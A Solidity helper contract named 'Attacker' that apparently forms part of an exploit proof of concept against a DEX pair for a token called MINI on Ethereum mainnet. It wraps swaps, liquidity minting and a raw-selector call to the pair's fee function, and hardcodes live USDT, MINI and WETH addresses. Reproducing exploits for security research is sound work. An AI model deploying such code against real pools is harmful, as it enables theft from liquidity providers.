// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IERC20A {
    function balanceOf(address) external view returns (uint256);
}

interface IV1PairA {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, address originSender, bytes calldata data) external;
    function mint(address to) external returns (uint256);
}

interface IV2PairA {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

/// Helper contract that acts as the external unprivileged attacker.
/// Uses low-level transfers because USDT does not return a bool (non-standard ERC20).
contract Attacker {
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant MINI = 0x4D953cf077c0C95Ba090226E59A18FcF97db44EC;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function swapV1(address pair, address tokenIn, uint256 amountIn, uint256 amount0Out, uint256 amount1Out) external {
        _safeTransfer(tokenIn, pair, amountIn);
        IV1PairA(pair).swap(amount0Out, amount1Out, address(this), address(this), "");
    }

    function swapV2(address pair, address tokenIn, uint256 amountIn, uint256 amount0Out, uint256 amount1Out) external {
        _safeTransfer(tokenIn, pair, amountIn);
        IV2PairA(pair).swap(amount0Out, amount1Out, address(this), "");
    }

    function transferToken(address token, address to, uint256 amount) external {
        _safeTransfer(token, to, amount);
    }

    function mintV1(address pair, address token0, address token1, uint256 amount0, uint256 amount1) external returns (uint256) {
        _safeTransfer(token0, pair, amount0);
        _safeTransfer(token1, pair, amount1);
        return IV1PairA(pair).mint(address(this));
    }

    function callGetMineFee(address pair, address who) external returns (bool ok, bytes memory ret) {
        (ok, ret) = pair.call(abi.encodeWithSelector(bytes4(0x8d7cf63a), who));
    }
}
